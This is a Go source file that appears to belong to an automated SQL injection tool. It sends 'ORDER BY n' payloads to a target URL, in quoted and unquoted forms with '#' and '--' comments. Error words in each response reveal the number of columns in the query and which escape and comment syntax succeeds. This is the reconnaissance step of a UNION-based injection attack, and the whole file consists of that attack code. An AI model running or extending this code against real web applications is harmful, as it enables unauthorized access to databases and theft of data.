package main
import ( 
	"strings"
	"fmt"
	"strconv"
	"net/url"
)

func Is_Invalid_Syntax(rbody string) bool {
	rbody = strings.ToLower(rbody)
	return strings.Contains(rbody, "error") ||
	strings.Contains(rbody, "syntax") || 
	strings.Contains(rbody, "invalid") ||
	strings.Contains(rbody, "missing")
}

func OrderBy_Hash_Executor(initbody string) int {
	var cmd string
	var endPoint string
	for i := 1; i <= 100; i++ {
		colNum := strconv.Itoa(i)
		cmd = fmt.Sprintf(" ORDER BY %s#", colNum)
		endPoint = queryURL + url.QueryEscape(cmd)
		resp := Send_Request("GET", endPoint)
		if (resp.StatusCode != 200) {
			continue
		}
		rbody := GetResponseBody(resp) 
		if i != 1 && Is_Invalid_Syntax(rbody) {
			commentType = "#"
			return i - 1;
		}
	}
	return 0
}

func OrderBy_Default_Executor(initbody string) int {
	var cmd string
	var endPoint string

	for i := 1; i <= 100; i++ {
		colNum := strconv.Itoa(i)
		cmd = fmt.Sprintf(" ORDER BY %s--", colNum)
		endPoint = queryURL + url.QueryEscape(cmd)
		resp := Send_Request("GET", endPoint)
		if (resp.StatusCode != 200) {
			continue
		}
		rbody := GetResponseBody(resp) 
		if i != 1 && Is_Invalid_Syntax(rbody) {
			commentType = "--"
			return i - 1;
		}
	}
	return 0
}

func OrderBy_Hash_Escaped_Executor(initbody string) int {
	var cmd string
	var endPoint string

	for i := 1; i <= 100; i++ {
		colNum := strconv.Itoa(i)
		cmd = fmt.Sprintf("' ORDER BY %s#", colNum)
		endPoint = queryURL + url.QueryEscape(cmd)
		resp := Send_Request("GET", endPoint)
		if (resp.StatusCode != 200) {
			continue
		}
		rbody := GetResponseBody(resp) 
		if i != 1 && Is_Invalid_Syntax(rbody) {
			escapeType = "'"
			commentType = "#"
			return i - 1;
		}
	}
	return 0
}

func OrderBy_Default_Escaped_Executor(initbody string) int {
	var cmd string
	var endPoint string

	for i := 1; i <= 100; i++ {
		colNum := strconv.Itoa(i)
		cmd = fmt.Sprintf("' ORDER BY %s--", colNum)
		endPoint = queryURL + url.QueryEscape(cmd)
		resp := Send_Request("GET", endPoint)
		if (resp.StatusCode != 200) {
			continue
		}
		rbody := GetResponseBody(resp) 
		if i != 1 && Is_Invalid_Syntax(rbody) {
			escapeType = "'"
			commentType = "--"
			return i - 1;
		}
	}
	return 0
}

func Run_OrderBy_Commands(rbody string) int {
	colNum := OrderBy_Default_Executor(rbody)
	if colNum == 0 {
		colNum = OrderBy_Default_Escaped_Executor(rbody)
	}
	if colNum == 0 {
		colNum = OrderBy_Hash_Escaped_Executor(rbody)
	}
	if colNum == 0 {
		colNum = OrderBy_Hash_Executor(rbody)
	}
	return colNum
}


